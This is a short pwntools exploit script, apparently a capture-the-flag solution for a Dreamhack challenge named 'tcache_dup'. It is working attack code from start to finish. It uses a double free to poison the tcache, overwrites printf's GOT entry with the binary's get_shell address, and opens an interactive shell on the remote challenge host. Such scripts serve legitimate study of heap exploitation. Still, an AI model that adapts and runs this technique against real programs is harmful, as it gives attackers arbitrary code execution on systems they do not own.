#!/usr/bin/python
from pwn import *

context.log_level = 'debug'
#p = process("./tcache_dup")
p = remote("host1.dreamhack.games", 8264)
elf = ELF("./tcache_dup")
get_shell = elf.symbols['get_shell']

def create(size, data):
    p.sendlineafter("> ", '1')
    p.sendlineafter("Size: ", str(size))
    p.sendafter("Data: ", data)

def delete(idx):
    p.sendlineafter("> ", '2')
    p.sendlineafter("idx: ", str(idx))


create(8, 'A'*8)

#Double Free
delete(0)
delete(0)

#gdb.attach(p)
# overwrite next pointer to get_shell
create(8, p64(elf.got['printf']))
create(8, 'A'*8)

# malloc on printf got & got overwrite 
create(8, p64(get_shell))

p.interactive()
 
